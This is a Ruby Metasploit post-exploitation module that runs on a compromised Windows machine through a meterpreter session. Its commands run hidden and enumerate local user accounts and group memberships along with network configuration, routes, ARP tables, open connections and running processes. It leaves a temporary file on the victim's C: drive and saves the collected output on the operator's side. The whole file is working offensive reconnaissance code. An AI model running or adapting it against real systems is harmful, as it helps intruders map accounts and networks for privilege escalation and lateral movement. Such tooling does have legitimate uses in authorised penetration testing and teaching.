require 'msf/core'
require 'rex'
require 'fileutils'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::System

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Information Dumper',
      'Description' => %q{
        This module dumps Windows user, group, and network information.
      },
      'License' => MSF_LICENSE,
      'Author' => ['3ls3if'],
      'Platform' => ['Windows'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options(
      [
        OptBool.new('USER', [false, 'Dump User Information', false]),
        OptBool.new('GROUP', [false, 'Dump Group Information', false]),
        OptBool.new('NETWORK', [false, 'Dump Network Information', false]),
        OptBool.new('ALL', [false, 'Dump All Information', false]),
      ], self.class
    )
  end

  def run
    user = datastore['USER']
    group = datastore['GROUP']
    net = datastore['NETWORK']
    all = datastore['ALL']

    if all
      user = group = net = true
    end

    if !user && !group && !net
      print_line("No options selected. Use -h for help.")
      return
    end

    host = session.tunnel_peer.split(':')[0]
    time = Time.now.strftime("%Y%m%d.%M%S")
    logfile = ::File.join(Msf::Config.log_directory, 'scripts', 'windump', "#{host}_#{time}.txt")
   # print_line("File Location: "+logfile)
    ::FileUtils.mkdir_p(::File.dirname(logfile))
    out = ""

    if user
      out << gather_user_info
    end

    if group
      out << gather_group_info
    end

    if net
      out << gather_network_info
    end

    file_local_write(logfile, out)
    print_status("WinDump has finished running")
  end

  def gather_user_info
    out = ""
    cmd = "cmd.exe /C wmic /append:c:\\user.out useraccount get Name"
    execute_cmd(cmd)

    wait_for_process("wmic.exe")

    cmd = "cmd.exe /C for /F \"skip=1\" %i in ('type c:\\user.out') do net user %i"
    out << "Gathering user information\n"
    out << execute_cmd_with_output(cmd)
    
    execute_cmd("cmd.exe /C del c:\\user.out")
    out
  end

  def gather_group_info
    out = ""
    grpcmd = "cmd.exe /C for /F \"delims=* tokens=1 skip=4\" %i in ('net localgroup') do net localgroup %i"
    out << "Gathering group information\n"
    out << execute_cmd_with_output(grpcmd)
    out
  end

  def gather_network_info
    out = ""
    netcmds = [
      "ipconfig /all",
      "route print",
      "arp -a",
      "netstat -ano",
      "tasklist /V"
    ]

    netcmds.each do |cmd|
      out << "Running Command #{cmd}\n"
      out << execute_cmd_with_output(cmd)
    end
    out
  end

  def execute_cmd(cmd)
    session.sys.process.execute(cmd, nil, { 'Hidden' => true })
  end

  def execute_cmd_with_output(cmd)
    out = ""
    p = session.sys.process.execute(cmd, nil, { 'Hidden' => true, 'Channelized' => true })
    while (data = p.channel.read)
      out << data
    end
    p.channel.close
    p.close
    out
  end

  def wait_for_process(process_name)
    running = true
    while running
      running = false
      session.sys.process.get_processes.each do |proc|
        if process_name.downcase == proc['name'].downcase
          sleep(1)
          running = true
        end
      end
    end
  end
end
